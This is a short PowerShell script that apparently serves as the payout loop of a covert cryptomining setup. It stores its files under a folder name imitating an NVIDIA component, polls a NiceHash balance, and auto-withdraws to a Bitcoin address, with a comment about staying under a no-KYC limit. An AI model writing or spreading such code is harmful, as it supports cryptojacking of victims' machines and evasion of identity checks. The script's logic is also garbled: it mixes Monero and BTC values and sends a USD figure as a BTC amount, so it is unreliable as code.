$APP   = "$env:APPDATA\NvBackend"
$HOOK  = Get-Content "$APP\hook.txt"
$ADDR  = "YOUR_BTC_ADDRESS"
$THRES = 1   # USD

function Get-Usd(){
    $xmr = (Invoke-RestMethod "https://api.coingecko.com/api/v3/simple/price?ids=monero&vs_currencies=usd").monero.usd
    $bal = (Invoke-RestMethod "https://api.nicehash.com/api?method=stats.provider.ex&addr=$ADDR").result.stats[0].balance
    return [float]$bal * $xmr
}

while ($true){
    $usd = Get-Usd
    if ($usd -ge $THRES){
        # NiceHash auto-withdraw (no KYC < 0.1 BTC)
        Invoke-RestMethod -Uri "https://api.nicehash.com/main/api/v2/accounting/withdrawal" `
            -Method Post -Headers @{Authorization="YOUR_NICEHASH_KEY"} `
            -Body (@{currency="BTC"; amount=$usd; address=$ADDR} | ConvertTo-Json)
    }
    Start-Sleep 600
}
